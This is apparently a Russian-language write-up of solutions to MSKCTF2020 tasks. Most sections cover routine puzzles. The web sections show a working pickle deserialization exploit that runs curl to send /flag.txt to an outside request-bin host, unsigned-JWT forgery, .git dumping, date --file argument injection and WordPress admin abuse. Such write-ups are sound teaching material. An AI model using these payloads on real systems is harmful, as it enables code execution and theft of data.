# MSKCTF2020
#### More-less [PPC]
Подключаемся по nc к заданию и видим, что от нас требуют угадать число при помощи бинарного поиска, реализацию которого можно написать на python.

#### Funny Farm [PPC]
Прочитав условие задачи можно понять, что это знаменитая игра быки и коровы (она же Mastermind). Существует много способов решения, здесь использовано дерево исходов.

#### Simple [RE]
Запустив несколько раз исполняемый файл, приходим к выводу, что зашифрованное значение символа не зависит от последующих. Значит, можно перебирать флаг посимвольно, сверяясь с содержимым файла `output.txt`.

#### Keycap [MISC]
Изучив `dump.pcap` с помощью wireshark, понимаем, что перед нами находится usb capture. По запросу "ctf usb capture" находим скрипт https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/USB/ и запускаем: `python ./script.py dump.pcap`.
Вывод:


`[+] Found : keycap.tasks.2020.ctf.cs.msu.ru<RET>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZXRGbGFnIjoiVHJ1ZSIsInNob3dGbGFnIjoiRmFsc2UifQ.<RET>`


Видим url и JWT токен. Пробуем отправить токен в форму на http://keycap.tasks.2020.ctf.cs.msu.ru и получаем ответ


>Flag is already set!


Разбираемся в чем дело. Пробуем раздекодить токен в base64 - `{"typ":"JWT","alg":"none"}.{"setFlag":"True","showFlag":"False"}`. Видим, что токен ничем не подписан и его можно изменять как хочется. Если установить `{"setFlag":"False","showFlag":"True"}` и сдать вновь полученный токен, сервис отдаст флаг.

#### Display I,II [MISC]
Просмотрев гифку замечаем, что считыванию qr кода мешают пиксели, которые не меняются на протяжении всей гифки. Значит нужно собрать QR код учитывая их расположение.

Прежде всего, гифку надо разбить по кадрам на картинки в формате jpg (для работы с OpenCV). Это делается с помощью онлайн конвертеров. Теперь можно приступать к написанию скрипта.

Открываем любое изображение из папки с кадрами гифки. Оно будет испольховаться для создания маски изменяющихся пикселей. Затем берем выборку кадров гифки(я взял кадры с кодом, но по сути можно взять любые другие, важно количество). Проходимся по выборке и ищем пиксели, которые от кадра к кадру меняются и отмечаем их на изображении-маске зеленым цветом. После завершения  анализа выборки, получаем изображение-маску, где зеленым отмечены пиксели не подверженные помехам. Открываем изображение, в которое будет записываться итоговый код, определяем область куда он будет записываться и обводим эту область белой рамкой, тк отступ вокруг кода является обязательным условием для сканирования(как выяснилось, хватило верхнего и  правого отступа). Далее берем выборку кадров с проходом qr кода, находим координаты кода на первой картинке и на сколько пискелей код сдвигается с каждым кадром. Учитывая это, анализируем в каждом изображении область в которой находится код следующим образом: если пикслель кода совпадает с зеленым пикселем маски, то переносим этот пиксель на итоговое изображение, учитывая его цвет для создания черно белого кода. Проанализировав таким образом всю выборку прохода кода, получаем готовый читаемый код. Скрипт работает как для Display I, так и для Display II.

#### Pickle [WEB]

Сразу после прочтения названия таска становится понятно, что он будет связан с "опасной" сериализацией в модуле pickle.

Немного осмотрев сервис, понимаем, что у нас есть возможность кастомизировать внешний вид текста на главной странице путем изменения параметров на /customize, которые в свою очередь сохраняются в куках. На этой же странице и происходит сериализация. Теперь нужно написать/нагуглить эксплойт. 

В интернете достаточно примеров эксплойтов, однако в процессе эксплуатации становится понятно, что некоторые модули(например, builtins) забанены, нужно искать другие пути. 

На странице документации пикла узнаем о возможности использования разных протоколов(0-5), отличающихся своей новизной. Попробуем наш эксплойт с 0ым протоколом.

```
import pickle
import base64

class Exp(object):
    def __reduce__(self):
        return (eval, ("""__import__('os').system('curl  http://pomo-mondreganto.me/request_bin/bin/3a7af4223a')""",),)


shellcode = pickle.dumps(Exp(), protocol=0)
print(base64.b64encode(shellcode))
```

Для этого пытаемся сделать eval(), c помощью которого импортируем os и вызваем system(). Следующая часть пейлоада - попытка отправить себе запрос на request-bin через curl. Копируем полученный base64 и заменяем значение куки custom_style.

Получаем запрос, значит эксплойт сработал. Осталось отправить себе флаг, однако для этого нужно понять, где он лежит. Пробуем несколько раз, получаем флаг. Для отправки файла себе я использовал опцию --data-binary.


#### Финальный эксплойт:
```
import pickle
import base64

class Exp(object):
    def __reduce__(self):
        return (eval, ("""__import__('os').system('curl --data-binary @"/flag.txt" http://pomo-mondreganto.me/request_bin/bin/3a7af4223a')""",),)


shellcode = pickle.dumps(Exp(), protocol=0)
print(base64.b64encode(shellcode))
```
#### В результате должен прийти такой запрос:

![Request example](https://github.com/WATyag/MSKCTF2020/blob/master/pickle/requestbin.jpg)

#### Beta release [WEB]

Таск представляет из себя сервис, целью которого видимо является троллинг участников, так как при попытке получить абсолютно любой флаг мы получаем один и тот же ответ - "Такой флаг еще не подвезли :(". Что же, попробуем разобраться и найти настоящий флаг, утерев нос обидчикам!

Первичный анализ обширных возможностей таска не дал нам никаких интересных результатов, поэтому попробуем поискать "поглубже", используя dirsearch.

`python3 dirsearch.py -u http://beta-release.tasks.2020.ctf.cs.msu.ru/ -e php html js`

```
Target: http://beta-release.tasks.2020.ctf.cs.msu.ru/

[14:44:22] Starting:
[14:44:22] 400 -  182B  - /%2e%2e/google.com
[14:44:22] 200 -   12B  - /.git/COMMIT_EDITMSG
[14:44:22] 200 -  137B  - /.git/config
[14:44:22] 200 -   73B  - /.git/description
[14:44:22] 200 -  691B  - /.git/index
[14:44:22] 200 -   23B  - /.git/HEAD
[14:44:22] 200 -  250B  - /.git/info/exclude
[14:44:22] 200 -   10KB - /.git/logs/refs/heads/master
[14:44:22] 200 -   56KB - /.git/logs/HEAD
[14:44:22] 200 -   41B  - /.git/refs/heads/master
[14:44:22] 200 -   54B  - /.gitignore
[14:44:22] 200 -   54B  - /.gitignore/
[14:44:27] 200 -    2KB - /contacts
```

Проанализировав результаты понимаем, что разработчики "забыли" удалить гит репозиторий. Попробуем сдампить его, для этого воспользуемся тулзой git-dumper. Далее войдя в папку со скачанным репозиторием, посмотрим историю коммитов:


`git log`

Листая историю коммитов замечаем следующее:

```
commit e9d0319984c8ea23b61ebd83da25507c973d19d1
Author: Ivan Gorsky <kek@hotmail.com>
Date:   Wed Mar 11 22:22:31 2020 +0300

    метод получения флага
    флаг для тестирования
```

Интересно, посмотрим сами изменения:

`git show  e9d0319984c8ea23b61ebd83da25507c973d19d1`


```
commit e9d0319984c8ea23b61ebd83da25507c973d19d1
Author: Ivan Gorsky <kek@hotmail.com>
Date:   Wed Mar 11 22:22:31 2020 +0300

    метод получения флага
    флаг для тестирования

diff --git a/main.py b/main.py
index cf4d6c8..1a127ae 100644
--- a/main.py
+++ b/main.py
@@ -1,22 +1,41 @@
 from flask import Flask
 from flask import render_template
+from flask import request

 app = Flask(__name__, template_folder="templates/", static_folder="./")

+flags = {
+    'alpha-version': 'MSKCTF{l34v1g_g1t_f0ld3r_1s_t00_b4d_id34_l0l}',
+    'keycap': '',
+    'happy_new_rtfm': '',
+    'Le Coq': '',
+    'This is the way': '',
+    'pickle': '',
+    'librecloud': '',
+    'corehard': '',
+    'crypto-300': '',
+    'Turtle': '',
+    'Funny Farm ': ''
+}
+
...
```
#### Happy new RTFM [WEB]

На главной странице таска нас встречает обратный отсчет до нового года. Попробуем разобраться как он работает. 

Файл utils.js отправляет запрос /get_date.php, где через  переменную fmt указывает формат времени. get_date.php возвращает текущее время в заданном формате, после чего расчитывается оставшееся время до нового года и запускается таймер.

В самом таймере нет ничего интересного, а вот возможность передавать данные get_date.php выглядит перспективно.

Отправляя туда всякий шлак в попытках разобраться, что именно выполняет данный скрипт, получаем следующий ответ:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 12:41:25 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.0
Content-Length: 68

date: invalid option -- 'l'
Try 'date --help' for more information.
```

Тут же понимаем, что это вывод date Linux. Попробуем отправить --help:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 12:45:49 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 4704
Connection: close
X-Powered-By: PHP/7.4.0
Vary: Accept-Encoding

Usage: date [OPTION]... [+FORMAT]
  or:  date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]
Display the current time in the given FORMAT, or set the system date.

Mandatory arguments to long options are mandatory for short options too.
  -d, --date=STRING          display time described by STRING, not 'now'
      --debug                annotate the parsed date,
                              and warn about questionable usage to stderr
  -f, --file=DATEFILE        like --date; once for each line of DATEFILE
  -I[FMT], --iso-8601[=FMT]  output date/time in ISO 8601 format.
                               FMT='date' for date only (the default),
                               'hours', 'minutes', 'seconds', or 'ns'
```

Замечаем опицию -f , умеющую читать дату из файла. Это выглядит как то, что нам нужно. Отправим --file=/etc/flag.txt :

![burp request](https://github.com/WATyag/MSKCTF2020/blob/master/Happy%20new%20RTFM/burp.jpg)

#### Incident [WEB]

Исследуя таск замечаем, что подключеный к странице not-a-flag.js, который блокируется правилами csp. Также делается запрос на /csp-reports, где помимо прочего передается uri заблокированного файла. Ответ на этот запрос таков:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 12:12:58 GMT
Content-Type: text/plain
Content-Length: 96
Connection: close
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://code.jquery.com/ https://cdnjs.cloudflare.com/ https://maxcdn.bootstrapcdn.com/; report-uri /csp-reports

DEBUG: the js /not-a-flag.js with content 'This file does not contain a flag' is blocked by CSP
```

Стоит отметить, что при попытке перейти на /not-a-flag.js таск возвращает 404. Попробуем перехватить запрос через burp и заменить "not-a-flag.js" на что-то более интересное. 

Пробуем 'flag.txt', получаем:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 12:22:43 GMT
Content-Type: text/plain
Content-Length: 58
Connection: close
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://code.jquery.com/ https://cdnjs.cloudflare.com/ https://maxcdn.bootstrapcdn.com/; report-uri /csp-reports

DEBUG: the js /flag.txt with content '' is blocked by CSP
```

Быть может, flag.js? Ведь изначально к странице подключался javascript файл. Ответ:

![burp request](https://github.com/WATyag/MSKCTF2020/blob/master/Incident/burp.jpg)

#### Truth News [WEB/OSINT]

*До хинта*

Тупим, тыкаемся во все, что попадется на глаза, толком не понимаем, что нужно делать.

*Хинт* 

`Hint: Мы знаем, что автор сайта любит снимать челленджи для соцсетей и плохо запоминает пароли.`

*После хинта*

 Понимаем очевиднейший(учитывая содержаение сайта) намек на тикток, ищем там пользователя с таким же ником(covidbuster), находим в его профиле видео, где совершенно случайно палится логин и пароль(login - covidbuster; password - CTF_p@ssw0rd):
 
 ![Tik-Tok](https://github.com/WATyag/MSKCTF2020/blob/master/Truth%20News/tikitikitok.jpg)
 
 Учитывая, что таск написан с использованием wordpress, нетрудно догадаться, что перед нами логин и пароль от админки. Ищем ее через dirsearch или гуглим дефолтный роут(его также можно найти на /?page_id=2) - "/wp-admin".

 Заходим в админку, замечаем установленный плагин WP File Manager. Меняем в его настройках "Public Root Path" на "/", находим флаг.
